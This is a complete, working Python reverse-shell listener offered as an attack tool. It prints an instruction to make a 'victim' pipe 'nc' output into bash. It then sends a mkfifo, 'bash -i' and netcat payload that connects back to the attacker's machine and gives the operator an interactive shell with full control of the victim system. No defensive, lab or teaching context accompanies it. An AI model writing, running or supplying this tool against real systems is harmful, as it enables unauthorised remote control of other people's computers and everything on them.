#!/usr/bin/env python3

import socket
import sys
import select
import termios
import tty
import os
import threading
import time
import shutil
import signal

# ─────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def get_terminal_size():
    size = shutil.get_terminal_size(fallback=(80, 24))
    return size.lines, size.columns

def make_server(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    return srv

def banner():
    print("\033[1;32m")
    print("  ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗")
    print("  ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝")
    print("  ██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗  ")
    print("  ██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝  ")
    print("  ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗")
    print("  ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝")
    print("                    S H E L L   L I S T E N E R")
    print("\033[0m")

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

banner()

ATTACKER_IP = get_local_ip()
print(f"  \033[1;34m[*]\033[0m Detected IP : \033[1;33m{ATTACKER_IP}\033[0m")

try:
    PORT = int(input("  \033[1;34m[?]\033[0m Listen port : ").strip())
except ValueError:
    PORT = 4444

SHELL_PORT = PORT + 1

print(f"  \033[1;34m[*]\033[0m Cmd  port   : {PORT}")
print(f"  \033[1;34m[*]\033[0m Shell port  : {SHELL_PORT}")
print()

# ─────────────────────────────────────────
#  WAIT FOR SHELL ON PORT+1 (background)
# ─────────────────────────────────────────

shell_sock = None
shell_ready = threading.Event()

def await_shell():
    global shell_sock
    srv = make_server(SHELL_PORT)
    srv.settimeout(60)
    print(f"  \033[1;34m[*]\033[0m Waiting for shell on port {SHELL_PORT}...")
    try:
        shell_sock, addr = srv.accept()
        print(f"  \033[1;32m[+]\033[0m Shell connected from {addr[0]}:{addr[1]}")
        shell_ready.set()
    except socket.timeout:
        print(f"  \033[1;31m[!]\033[0m Shell timed out on port {SHELL_PORT}")
    finally:
        srv.close()

t = threading.Thread(target=await_shell, daemon=True)
t.start()
time.sleep(0.3)

# ─────────────────────────────────────────
#  WAIT FOR VICTIM NC CONNECTION
# ─────────────────────────────────────────

print(f"  \033[1;34m[*]\033[0m Waiting for victim on port {PORT}...")
print(f"  \033[1;33m[!]\033[0m Tell victim to run:")
print(f"\n      nc {ATTACKER_IP} {PORT} | bash\n")

cmd_srv = make_server(PORT)
cmd_sock, addr = cmd_srv.accept()
cmd_srv.close()
print(f"  \033[1;32m[+]\033[0m Victim connected from {addr[0]}:{addr[1]}")

# ─────────────────────────────────────────
#  SEND PAYLOAD
# ─────────────────────────────────────────

rows, cols = get_terminal_size()

payload = (
    f"rm -f /tmp/.rs; mkfifo /tmp/.rs; "
    f"export TERM=xterm; "
    f"stty rows {rows} cols {cols}; "
    f"cat /tmp/.rs | bash -i 2>&1 | nc {ATTACKER_IP} {SHELL_PORT} > /tmp/.rs\n"
)

print(f"  \033[1;34m[*]\033[0m Sending payload...")
try:
    cmd_sock.sendall(payload.encode())
    time.sleep(0.5)
    cmd_sock.close()
except Exception as e:
    print(f"  \033[1;31m[!]\033[0m Failed to send payload: {e}")
    sys.exit(1)

# ─────────────────────────────────────────
#  WAIT FOR SHELL CALLBACK
# ─────────────────────────────────────────

print(f"  \033[1;34m[*]\033[0m Payload sent. Waiting for shell callback (60s)...")
shell_ready.wait(timeout=60)

if not shell_sock:
    print("\n  \033[1;31m[!]\033[0m Shell did not connect back.")
    print("      - Victim needs bash + nc installed")
    print(f"      - Check port {SHELL_PORT} is not firewalled")
    sys.exit(1)

# ─────────────────────────────────────────
#  SYNC TERMINAL SIZE
# ─────────────────────────────────────────

time.sleep(0.3)

# Drain junk
shell_sock.setblocking(False)
try:
    while shell_sock.recv(4096):
        pass
except:
    pass
shell_sock.setblocking(True)

sync = f"stty rows {rows} cols {cols}\nexport TERM=xterm\nclear\n"
shell_sock.sendall(sync.encode())
time.sleep(0.3)

print(f"  \033[1;32m[+]\033[0m Shell ready! Rows={rows} Cols={cols}")
print(f"  \033[1;34m[*]\033[0m You have full control. Ctrl+C to exit.\n")
print("─" * 60)

# ─────────────────────────────────────────
#  AUTO RESIZE ON WINDOW CHANGE
# ─────────────────────────────────────────

def on_resize(signum, frame):
    r, c = get_terminal_size()
    try:
        shell_sock.sendall(f"stty rows {r} cols {c}\n".encode())
    except:
        pass

signal.signal(signal.SIGWINCH, on_resize)

# ─────────────────────────────────────────
#  INTERACTIVE LOOP
# ─────────────────────────────────────────

fd = sys.stdin.fileno()
old_settings = termios.tcgetattr(fd)

try:
    tty.setraw(fd)

    while True:
        rlist, _, _ = select.select([sys.stdin, shell_sock], [], [], 0.1)

        for ready in rlist:
            if ready == shell_sock:
                data = shell_sock.recv(4096)
                if not data:
                    raise Exception("Victim disconnected")
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

            elif ready == sys.stdin:
                char = os.read(fd, 1)
                if not char:
                    raise Exception("stdin closed")
                shell_sock.sendall(char)

except KeyboardInterrupt:
    pass

except Exception as e:
    sys.stdout.write(f"\n\033[1;31m[!] Disconnected: {e}\033[0m\n")

finally:
    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    try:
        shell_sock.close()
    except:
        pass
    print("\n\033[1;32m[*]\033[0m Terminal restored. Session ended.")
